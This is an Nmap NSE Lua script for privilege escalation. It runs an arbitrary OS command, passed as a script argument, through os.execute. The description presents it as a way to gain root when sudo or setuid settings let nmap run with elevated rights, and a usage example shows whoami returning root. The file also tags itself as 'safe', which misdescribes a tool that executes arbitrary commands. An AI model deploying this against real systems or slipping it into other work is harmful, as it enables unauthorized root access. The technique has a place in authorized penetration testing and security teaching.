local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local command  = stdnse.get_script_args(SCRIPT_NAME .. ".command") or nil
print("Command Output:")
local t = os.execute(command)

description = [[
This is a basic script for executing os commands through a nmap nse module (lua script).
It can be used for escalating privileges when bad sudo/setuid configuration allow execution of nmap as root.
Alternatively, it could also potentially be used to execute arbitrary commands in constrained environments.
It's nothing fancy, there'ss no error handling, and I'm likely not going to spend time to fix it. :)
]]

---
-- @usage
-- nmap --script=./exec.nse --script-args='command=whoami'
-- @output
-- Output:
-- root
-- @args command

author = "Scott Sutherland"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"vuln", "discovery", "safe"}

portrule = shortport.http

action = function(host,port)
        
end
